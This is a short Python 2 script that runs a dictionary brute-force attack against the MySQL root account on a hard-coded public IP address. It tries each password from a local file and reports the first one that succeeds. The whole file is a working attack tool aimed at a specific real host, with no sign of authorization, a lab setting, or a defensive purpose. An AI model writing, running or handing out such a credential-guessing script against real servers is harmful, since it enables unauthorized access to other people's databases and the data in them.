import MySQLdb
host='139.196.232.148'
user='root'

passwds = open('password.txt')

for passwd in passwds:
    try:
        print "test: ", passwd, '\r',
        MySQLdb.connect(host=host, user=user, passwd=passwd.strip('\n'))
        print 
        print 'suc:', passwd
        exit()
    except Exception, e:
        pass